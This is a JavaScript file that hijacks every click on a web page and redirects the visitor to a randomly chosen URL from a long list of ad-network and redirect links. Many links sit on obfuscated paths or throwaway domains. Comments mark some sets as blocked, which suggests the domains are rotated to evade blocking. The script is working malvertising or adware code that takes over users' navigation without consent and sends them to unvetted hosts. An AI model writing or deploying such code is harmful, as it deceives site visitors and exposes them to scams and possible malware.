function init() {
  var arr = [
    // first
    'https://cloudysolid.com/bD3/V/0IP.3Lp/vJbsm/V/J/Z/Dv0q1TMETUkN5/MhzEg/y/LXTEU/xwOrTlk/zKO_DkMt',
    'https://cloudysolid.com/b.3/Vz0DPA3_pgvHbUmEV/JXZvD_0e1XMFj/UFyhNzj/UT2JLfThUvyTNNTUId2-NNTncj',
    'https://cloudysolid.com/bt3.VD0/PY3qplvhb/mHVvJIZWDM0A1ZMLT-k/5/NZDcAjwfLhTAUexjOfTjk_0fMRDAEi',
    'https://cloudysolid.com/b.3OVq0fPW3lpNvobMmAVMJjZBDF0/1rM_Tnkk5RNwDRAJ4nLGTeUnxRObTNkq0/M/D/k_',
    'https://cloudysolid.com/b/3/V.0/Pe3NpnvrbFmSViJXZYDB0w1/MXzTEA0HOiTaUw5ALVT/USzvM/TwQJ5/NRjeAW',

    'https://cloudysolid.com/bf3wV/0.PQ3/pYvObTmMVkJrZND-0l1gM_zaMcxZNuj/EgzfLETnULzlM/z/E/2/MITUQZ',
    'https://cloudysolid.com/bs3fVP0jP.3xpqvzbImmVkJPZ/Dp0x1/MZzfMuzgMFTJMQ1rLOTfU/zCM/zGMHx/Maz-YI',
    'https://cloudysolid.com/b.3MVw0hP/3rpRv/bBmcV/J/ZcDR0K1cM/z/cm5_MWjwU/2FLmTsUYztNvzNkgy/NLTXcb',
    'https://cloudysolid.com/bc3.Vo0CPe3lp/v/bLmDV/J-Z/Dj0o1zM/zTcO5JMhj/Yg0sL/T/U/zTNjzwkRynNWjVUs',
    'https://cloudysolid.com/b/3.Ve0QPV3ipdvjbdmhVVJHZ/D/0T1uM_z_c/5DM/j/c/yLLWT/UdzQNBzNkYywNDzCMw',

    // db123
    // 'https://classic-bonus.com/b/3JVg0.PI3xpKvtbJm_VwJSZADQ0/1oMDzecuy/Maj/cJ2kLsTrU/z/NfziIJynNqz/cY',
    // 'https://classic-bonus.com/bo3FVD0.Pb3_pSvkbBmkVaJPZXDK0i1zMYzFcMyGMEjMgw0RLiT-UxzaN/zrI/yUO-D/UQ',
    // 'https://classic-bonus.com/bu3_Vt0.Py3OpavUbGmsVHJVZJD/0/1xMVzecpy/MHj/kx0jLfTvUTzGNRzrIUy/OYTEU-',
    // 'https://classic-bonus.com/bV3.Vy0NPF3ip/vDbkmdVyJ/ZQDN0C1EMazncjyEMLz-AtylLFTOUvzANezCIMzDMzDAMz',
    // 'https://classic-bonus.com/bz3_V.0gPR3GptvnbRmvVZJfZ-Dw0l1/MuzecoylMwzAEiwWLeTzUrzMNqzeI/zpMWTpEM',

    // 'https://classic-bonus.com/bo3pV.0mPR3opGv/b/mDVlJyZlDA0y1XMRzfgsxNN/DHA/4DLBTwUkzOOZDfEZ0GMeD-kg',
    // 'https://classic-bonus.com/b.3pV/0/Pn3BpKvGbbmQVjJfZaDs0b1cMyzXgoxBNCDFEo2rL/TJUyzXObDHE-0/MyTicN',
    // 'https://classic-bonus.com/b.3/Ve0hPs3IpLv/bCmIVaJgZUDJ0n1AM/zggix/NGD/IO0CLnTgUhzeOLD/E-0-M/jiUY',
    // 'https://classic-bonus.com/b.3/Vo0/PC3GpNv-b_mHVlJuZ/Dr0t1DMnzdk_1uN/zWM/2zLRTyUfzuOcT/UL3CM/zlcK',
    // 'https://classic-bonus.com/bu3RVt0kP.3MpQvHbRmVVZJ/ZlDT0h1VMIzMks1/N_zmQn0/LoTAUbzfODTxUz3PNdD/U-',

    // jacklove
    // 'https://indolent-ability.com/bC3zVD0.Pb3XpRvrbwmwVfJ/ZLDF0/1/Mozsgxx/M/DVAJwwLKTZUizyORD-EAwKMyDzEY',
    // 'https://indolent-ability.com/b.3mVR0aPg3fp/vdbYmvVkJnZODI0/1lMGz/gLxPMDDQAc4-LGT/UYz_OkD/EswdMEDNkS',
    // 'https://indolent-ability.com/bL3-VY0.Pu3Qp/vQbbmAV/JPZxDe0Y1vMPz/gvxlMEDtE/2lLpTDUHz/OQDWEqwCMyTbcZ',
    // 'https://indolent-ability.com/bx3SV.0iPo3Pp/v/bVmAV-JAZbDx0/1/MazugExVMrzZY_4wL/TMUozKO/DdEnzuNIjIkk',
    // 'https://indolent-ability.com/bO3/VG0.PA3HpQvibJm/VmJeZSD-0c1JMxz/gLx/MDzEgo0GLyTNUtzoODDbEPzYOVD-Ue',

    // 'https://indolent-ability.com/b_3gV.0hPE3/pavHbqm/VdJeZvDy0K1_Mtzpk/0kODDakLyCLQT/UAzKODTXQa4vOJTUMs',
    // 'https://indolent-ability.com/b.3GVT0/Pm3lpOvAbfmWVXJLZnDS0O1iM/zWkN0fOvTJAEw_L/TLUqz_O/TXQo5sMUDaEB',
    // 'https://indolent-ability.com/b/3eVf0JP.3/p/v-bdmFVRJUZADU0d1LMqz/kZ1oN/zwUHy/LXTGURziOPTRUu3AN-TbMA',
    // 'https://indolent-ability.com/b.3/Vi0ZP/3Zpsv/bnmeVhJRZcDU0m1-MTzBkw1xNKzKYZwBL/TNUizxOXToU/3eNEj/Ey',
    // 'https://indolent-ability.com/b.3AVj0eP/3SpQvFbnmWVVJRZDDk0a1FM/z-km1jNxzjYy4iLITSUBzJOdToUF3rNQj/km',

    // // john(decline)
    // 'https://soupy-user.com/b/3.Vw0_PL3RpIvLbVm/VMJrZRDj0/1_MvzPYQ3TMjztIlyOLbT/UszcNBjPcszdMdjFMG',
    // 'https://soupy-user.com/bS3QVO0.Pi3Kp-v/bUmPVqJDZ_DM0/1/MvzqYa3NMDzzEl0YLeT/UPzlNzjYc/zFMPT/UY',
    // 'https://soupy-user.com/b/3LVu0JP.3/pDvxbrmAVSJxZiDn0F1EM/zEYM3yMWjMgk4/L/TPUazFNqjvcXyOOTDikj',
    // 'https://soupy-user.com/bU3gV.0cPp3dpTvPbGm/V-J/ZXDV0e1kMDzMYG3MMMzTc/yALRT/UlzENpjNc/zINuzvMu',
    // 'https://soupy-user.com/bi3.VB0LPM3cpvvTbVmdVFJnZLDB0a1-MzziYS3jMezAYIylLlTSU-znNojtc/zvNtjjMs',

    // // lucy(block)
    // 'https://mutedpoetry.com/bV3.Vz0kP/3opVvIb/mYVdJyZoDK0/1ZMyzXYl4kNWzfM/y-LBTkUOzjN/jng/3_MWzSMG',
    // 'https://mutedpoetry.com/b.3zVQ0/P/3Wp_vYbOmQVLJVZ/DN0z1qMEzeYr4fNOzOIn0ULPTrUWztNgjIgZ3rM-jnUp',
    // 'https://mutedpoetry.com/bl3fVE0/P.3/ptvzbcmxVlJDZVDi0-1/MlzYYJ4DNTzWE/2kLmTDU/zXNEjFgS3vM/T/cn',
    // 'https://mutedpoetry.com/bp3fVy0/P.3YpUvebimjV/JtZjDe0/1-M/zaYa4/N-jXk/4oLBTLUOzcNpj/gk2NOHTekv',

    // mon
    'https://thelrourg.net/4/7237942',
    'https://woafoame.net/4/7237941',
    'https://corgouzaptax.com/4/7474716',
    'https://eeptoabs.com/4/7420689',
    'https://thechoansa.com/4/7237907',

    'https://psomtenga.net/4/7420696',
    'https://kaushooptawo.net/4/7237921',
    'https://vekseptaufin.com/4/7420698',
    'https://thomtubsaro.com/4/7436813',
    'https://grushoungy.com/4/7614690',

    // // beta(block)
    // 'https://www.highcpmgate.com/zecjzrgcb?key=cee82a79ba80cedd47dc67c990c43981',
    // 'https://www.highcpmgate.com/dt96vw75f?key=4c755e88f5de59ca53ef34992768986a',
    // 'https://www.highcpmgate.com/gqz2615ye8?key=fa0feaae93d41f849f02500024a84fc8',
    // 'https://www.highcpmgate.com/egwhqfd5j4?key=a78fdce973ec5e6fdfe7a340cbe80330',
    // 'https://www.highcpmgate.com/z8767nw9bd?key=dd73fef32d545b5b5559b3dd496c33b8',
    // 'https://www.highcpmgate.com/dmm6uzza8y?key=ae8300ee01b398a137d6f63fcc00bd63',
    // 'https://www.highcpmgate.com/e6c1p52s2n?key=6b16c783c5b3542a115fb23958f8a755',
    // 'https://www.highcpmgate.com/pmy722dia8?key=43d6dbe10c1901c59565bb335437c63f',

    // John beta(block)
    // 'https://www.highcpmgate.com/mggp0d1rd?key=4a8cc439d8f03fbe93ede925886e0967',
    // 'https://www.highcpmgate.com/d61bt4eq5?key=50e22b35ce929782b3d0e55721cf6291',
    // 'https://www.highcpmgate.com/u2f5xpf0sh?key=35d46124492e301d6b7f93d0e323cd15',

    // Jack beta(block)
    // 'https://www.highcpmgate.com/wa4ni64n7?key=94a693ff93ae2f33305c8039fd3c1a7b',
    // 'https://www.highcpmgate.com/t3y2ebta?key=540b4b6dee7d82872a8ad8935ecf83a4',
    // 'https://www.highcpmgate.com/n5zwpc5h1?key=1dfa9fa5cffeb00bfffbfda37a43407f',
    // 'https://www.highcpmgate.com/y1i91ubt?key=12078ca6790ca0e3e0183b6d53dcc0f3',
    // 'https://www.highcpmgate.com/nqiy56uena?key=26807e7e722e2080c7a364711501aa5d',
    
    // Lucy beta
    'https://www.highrevenuenetwork.com/bu71hki7pg?key=b3d0aabe20e37ad2a080cef996e523a8',
    'https://www.highrevenuenetwork.com/spw4aigpi?key=2bfe09727d8f45c16edc5be8ce11fe73',
    'https://www.highrevenuenetwork.com/eeuiwn19?key=a0e1b3b183cb8921ed2aaca0c4cb4490',
    'https://www.highrevenuenetwork.com/q5kx6qdha?key=ba303090626471c9f450339de19b98be',
    'https://www.highrevenuenetwork.com/csdvh2ud?key=cb18caab3a96de3cec11deee57f1e7bc',

    'https://www.highrevenuenetwork.com/sinsdiqgi9?key=53e9c847f7c5dd151315203caf1e9d52',
    'https://www.highrevenuenetwork.com/p5tww3iey?key=79cf82d37bbc5d541d8b9f1cd490e72f',
    'https://www.highrevenuenetwork.com/snzzu32zv?key=51d98fb2c88138ff52842ebbdf5e7208',
    'https://www.highrevenuenetwork.com/dei9cpf8?key=de5a27a88f4a7d445ec6d8223b295d66',
    'https://www.highrevenuenetwork.com/zr0crh68?key=799ba5664e70bdf781b556024bd3e3a7',

    // Emily beta (blocked)
    // 'https://obliquecensortend.com/unjjajw4d?key=0cf45e318a7b88f458419087aa350ccc',
    // 'https://obliquecensortend.com/z2vva4za?key=58882b5697cf027450b33d8e82ebc4b9',
    // 'https://obliquecensortend.com/hpf7uuustd?key=ef91f1af82729948024a1f219624bdd9',
    // 'https://obliquecensortend.com/v381fsbtns?key=681a319357ee76a75910c90cb4b5c011',
    // 'https://obliquecensortend.com/gk3yvw2t?key=d2a556fe1d3e00914675176678c85903',

  ];
 
  var didOpen = false;
  document.addEventListener("click", function() {
    if (didOpen) {
      return;
    }
    didOpen = true;
    setTimeout(() => {
      didOpen = false;
    }, 3000);

    var randomIndex = Math.floor(Math.random() * arr.length);
    var randomLink = arr[randomIndex];
    window.location.href = randomLink;
  });
}

init();